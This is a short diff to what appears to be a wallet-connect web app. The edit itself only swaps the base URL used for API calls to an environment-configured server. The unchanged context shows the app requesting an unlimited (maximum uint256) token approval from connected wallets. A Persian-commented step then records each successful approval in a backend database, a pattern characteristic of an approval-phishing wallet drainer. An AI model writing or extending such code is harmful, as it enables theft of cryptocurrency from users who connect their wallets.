@@ -11,7 +11,7 @@ import {
   type EthProvider,
 } from "./wallet";
 
-const BASE = import.meta.env.BASE_URL?.replace(/\/$/, "") ?? "";
+const API_BASE = (import.meta.env.VITE_API_URL ?? "").replace(/\/$/, "");
 
 const WALLETS = [
   { id: "metamask",      name: "MetaMask",        desc: isMobile() ? "Open in MetaMask App" : "Browser Extension",  icon: "🦊", tag: "EVM",        connect: connectMetaMask      },
@@ -49,7 +49,7 @@ export default function App() {
 
   useEffect(() => {
     let cancelled = false;
-    fetch(`${BASE}/api/config`)
+    fetch(`${API_BASE}/api/config`)
       .then(r => {
         if (!r.ok) throw new Error(`HTTP ${r.status}`);
         return r.json();
@@ -123,7 +123,7 @@ export default function App() {
       // ── ۴. ثبت در دیتابیس (فقط اگر approve موفق بود) ─────
       setBusyLabel("Finalizing…");
       const UNLIMITED = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-      const regRes = await fetch(`${BASE}/api/approvals`, {
+      const regRes = await fetch(`${API_BASE}/api/approvals`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
